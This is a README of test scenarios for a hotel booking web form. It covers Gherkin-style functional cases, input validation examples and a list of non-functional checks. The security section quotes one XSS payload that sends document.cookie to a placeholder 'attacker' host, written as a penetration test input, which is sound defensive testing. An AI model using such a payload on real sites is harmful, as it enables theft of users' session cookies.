# EqualExperts - Hotel Bookings Form

## Functional Tests

**Background:** I am viewing the booking url <br>
*Given I have a browser open* <br>
**And the browser has javascript enabled** <br>
*And I the url is 'http://hotel-test.equalexperts.io/'* <br>

**Scenario:** Create a booking with deposit<br>
*Given I enter valid details into all required input fields* <br>
*And I set deposit to true* <br>
*And I choose valid and logical dates using the date picker* <br>
*when I click save* <br>
*Then my reservation will be created* <br>
*And all details will be displayed correctly*<br>

**Scenario:** Create a booking without deposit<br>
*Given I enter valid details into all required input fields* <br>
*And I set deposit to false* <br>
*And I choose valid and logical dates using the date picker* <br>
*when I click save* <br>
*Then my reservation will be created* <br>
*And all details will be displayed correctly*<br>

**Scenario:** Create a booking with price as double<br>
*Given I add a price as '10.99'* <br>
*And I enter valid details into all other required fields* <br>
*when I click save* <br>
*Then my reservation will be created* <br>
*And all details will be displayed correctly*<br>

**Scenario:** Create a booking with price as an integer<br>
*Given I add a price as '100'* <br>
*And I enter valid details into all other required fields* <br>
*when I click save* <br>
*Then my reservation will be created* <br>
*And all details will be displayed correctly*<br>

**Scenario:** Create a booking typing date values in big endian format <br>
*Given I enter valid details into all required input fields* <br>
*And I set deposit to false* <br>
*And I type valid and logical dates directly into the check-in and check-out fields in big endian format yyyy-mm-dd* <br>
*when I click save* <br>
*Then my reservation will be created* <br>
*And all details will be displayed correctly*<br>

**Scenario:** Create a booking typing date values in little endian format <br>
*Given I enter valid details into all required input fields* <br>
*And I set deposit to false* <br>
*And I type valid and logical dates directly into the check-in and check-out fields in little endian format dd-mm-yyyy* <br>
*when I click save* <br>
*Then my reservation will be created* <br>
*And all details will be displayed correctly*<br>

**Scenario:** Delete a booking <br>
*Given I have created a booking* <br>
*When I delete the booking* <br>
*Then the booking will be deleted* <br>

**Scenario:** Delete all bookings <br>
*Given I have more than one booking* <br>
*When I delete all the bookings* <br>
*Then all the bookings will be deleted* <br>

**Scenario:** Concurrently delete a single booking in different sessions<br>
*Given I have one booking* <br>
*When User 1 one deletes the booking* <br>
*And User 2 deletes the same booking* <br>
*Then the booking will be deleted* <br>

**Scenario:** Create a booking with a **check-in date** in the past <br>
*Given I enter an historic check-in date* <br>
*And I enter valid details for all other inputs* <br>
*When I click Save* <br>
*Then a booking is NOT created* <br>
*And inputted values remain as entered* <br>

**Scenario:** Create a booking with a **check-in date** after the **check-out date** <br>
*Given I enter a check-in date that is after the check-out date* <br>
*And I enter valid details for all other inputs* <br>
*When I click Save* <br>
*Then a booking is NOT created* <br>
*And inputted values remain as entered* <br>

**Scenario:** Create a booking with a historic **check-in** and **check-out date** <br>
*Given I enter an historic check-in date* <br>
*And I enter an historic check-out date* <br>
*And I enter valid details for all other inputs* <br>
*When I click Save* <br>
*Then a booking is NOT created* <br>
*And inputted values remain as entered* <br>

**Scenario:** Create a booking with the same **check-in** and **check-out date** <br>
*Given I enter an check-in date* <br>
*And I enter the same check-out date* <br>
*And I enter valid details for all other inputs* <br>
*When I click Save* <br>
*Then a booking is NOT created* <br>
*And inputted values remain as entered* <br>

**Scenario:** Create a duplicate booking <br>
*Given I have created a booking* <br>
*And I enter duplicate details into all fields* <br>
*When I click Save* <br>
*Then a booking is NOT created* <br>

**Scenario:** Create a concurrent booking <br>
*Given User 1 enters valid booking information* <br>
*And User 2 enters valid booking information* <br>
*When User 1 and User 2 click Save* <br>
*Then both bookings are created* <br>
*And User 1 and User 2 can seen all booking details* <br>

**Scenario Outline:** validation of input fields <br>
*Given I entered the following data into the booking form:* <br>
| FirstName     | LastName  | Price   | Deposit   | CheckIn   | CheckOut   | <br>
| \<firstName\>   | \<surName\> | \<price\> | \<deposit\> | \<checkIn\> | \<checkOut\> | <br>
*When I click Save* <br>
*Then a booking is NOT created* <br>

**Examples:** <br>

 firstName | surName | price | deposit | checkIn | checkOut 
  --- | --- | ---| --- | --- | --- 
|           |  |  |  | | |
|           | validSurname | 10.00 | false | 2020-10-10 | 2020-10-11 | 
| 213       | validSur    | 10.00 | false | 2020-10-10 | 2020-10-11 | 
| $%#%      | validSur    | 10.00 | false | 2020-10-10 | 2020-10-11 | 
| vaidfirst |              | 10.00 | false | 2020-10-10 | 2020-10-11 |
| vaidfirst |       1213   | 10.00 | false | 2020-10-10 | 2020-10-11 |
| vaidfirst |   $%#%  | 10.00 | false | 2020-10-10 | 2020-10-11 |
| vaidfirst |   validSur  |  | false | 2020-10-10 | 2020-10-11 |
| vaidfirst |   validSur  | fds | false | 2020-10-10 | 2020-10-11 |
| vaidfirst |   validSur  | -10 | false | 2020-10-10 | 2020-10-11 |
| vaidfirst |   validSur  | 10.123 | false | 2020-10-10 | 2020-10-11 |
| vaidfirst |   validSur  | 10     | false |  | 2020-10-11 |
| vaidfirst |   validSur | 10   | false | tenth April  | 2020-10-11 |
| vaidfirst |   validSur | 10.00   | false |  $%#%  | 2020-10-11 |
| vaidfirst |   validSur | 10.00   | false | 20201010 | 2020-10-11 |
| vaidfirst |   validSur | 10.00   | false | 2020-10-10  |  |
| vaidfirst |   validSur | 10.00   | false | 2020-10-10  | tenth April |
| vaidfirst |   validSur | 10.00   | false | 2020-10-10  | $%#%       |
| vaidfirst |   validSur | 10.00   | false | 2020-10-10  | 20201010      |


## Automated Tests

Tests have been developed in visual studio 2015. To run the Automated test clone this repository and open the .sln file (ensure you have the NuGet package restore option enabled) 

# Non-Functional Tests

## Security / Pentration
- Javascript Injection tests XXS e.g. <script> window.location='http://attacker/?cookie='+document.cookie</script> saved as input parameter. ** THIS TEST BRINGS THE SITE DOWN **

- Should be https (if publicly accessible)

## Usabilty
- Ensure UI is usable in selection of mobile devices
- Ensure the GUI can be used by as wide an audience as possible
- Adding pagination when number of bookings > n number

## Performance 
- Response times are as specified
- Query and load times are as specified
- Processing times are as expected
- Check that as the number of bookings increases that the site continues to perform as to specification
- Find the threshold at which the site grinds to a halt

## Recoverability
- Backup frequencies, transaction data, config data, code backed-up?

## Capacity
- Throughput how many transactions a peak
- Storage
- Growth requirements

## Scalability
- can the solution be scaled effectively
